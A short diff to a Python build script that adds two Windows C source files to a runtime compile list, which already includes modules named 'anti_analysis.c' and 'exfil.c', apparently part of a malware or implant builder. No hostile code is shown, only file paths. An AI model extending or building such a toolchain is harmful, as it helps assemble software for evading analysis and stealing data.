@@ -293,6 +293,8 @@ def stage_compile_runtime(build_dir, platform="windows"):
 
     WIN = RUNTIME_DIR / "windows"
     sources_win = [
+        WIN / "io" / "io_core.c",
+        WIN / "stubs" / "runtime_stubs.c",
         RUNTIME_DIR / "init" / "anti_analysis.c",
         RUNTIME_DIR / "util" / "mem.c",
         RUNTIME_DIR / "exfil" / "exfil.c",
